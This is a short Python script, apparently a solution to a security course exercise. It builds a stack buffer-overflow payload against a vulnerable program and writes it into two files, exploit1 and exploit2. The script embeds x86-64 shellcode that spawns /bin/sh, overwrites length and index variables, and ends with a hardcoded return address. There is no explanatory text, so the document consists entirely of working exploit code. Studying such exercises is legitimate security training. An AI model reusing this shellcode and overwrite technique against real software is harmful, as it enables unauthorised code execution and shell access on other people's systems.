import sys 

shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" #27 Bytes

def testing_data(num_bytes, letter):
    return letter * num_bytes

def splitBytesIntoTwo(payload):
	temp1 = b""
	temp2 = b""

	for i in range(len(payload)):
		temp_byte = payload[i]
		if i % 2 == 0:
			temp1 += temp_byte
		else:
			temp2 += temp_byte
	return (temp1, temp2)

def pack64(n): #function used in the excercise to convert address to little endian
	s = ""
	while n:
		s += chr(n % 0x100)
		n = n / 0x100
	s = s.ljust(8, "\x00")
	return s

buffer_addr = pack64(0x7fffffffdd40)

#building the payload
payload = b""
payload += shellcode
payload += testing_data(57, "A")
payload += b"\x38\x00\x00\x00" #for byte_read2
payload += b"\x38\x00\x00\x00" #for byte_read1 
payload += b"\x5c\x00\x00\x00" #for idx
payload += testing_data(8, "A")
payload += buffer_addr
#print(payload)

dividedPayload = splitBytesIntoTwo(payload)

#Write to both exploit files
with open("exploit1", 'wb') as f:
	f.write(dividedPayload[0])
with open("exploit2", 'wb') as f:
	f.write(dividedPayload[1])
